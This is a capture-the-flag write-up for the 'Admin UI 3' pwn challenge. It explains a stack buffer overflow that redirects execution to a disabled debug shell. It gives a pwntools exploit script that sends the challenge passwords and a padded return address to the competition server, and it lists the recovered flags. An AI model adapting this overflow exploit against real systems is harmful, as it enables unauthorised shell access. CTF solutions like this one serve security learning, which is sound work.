[../](../../)

# ADMIN UI 3

## pwn-re

> The code quality here is terrible. Even the temperature scale is measured in "Kevins". Just bad Q/A all around here. If they choose to measure in Kevins rather than Kelvins, then it's a sure bet that they can't handle their memory properly. It looks like this also controls the SmartFridge2000 internal temperature for that whole home "just-works" experience.

Now, with having service access, we get a pseudo shell and we can enter `debug`, that prints out the vmmap, and `shell` that should spawn a real shell, but was disabled.

Here, we can overflow the buffer and control the `RIP` to jump to the `_Z11debug_shellv` symbol, that the `shell` command should actually call.

Exploit script

```python
from pwn import *

e = ELF('admin-ui')

p = remote('mngmnt-iface.ctfcompetition.com', 1337)

p.sendline('1')
p.sendline('CTF{I_luv_buggy_sOFtware}')
p.sendline('CTF{Two_PasSworDz_Better_th4n_1_k?}')

p.sendline('A' * 56 + p64(e.symbols['_Z11debug_shellv']))
p.sendline('quit')
p.interactive()
```

Then we find another flag file, namely `an0th3r_fl44444g_yo`.

flag: `CTF{c0d3ExEc?W411_pL4y3d}`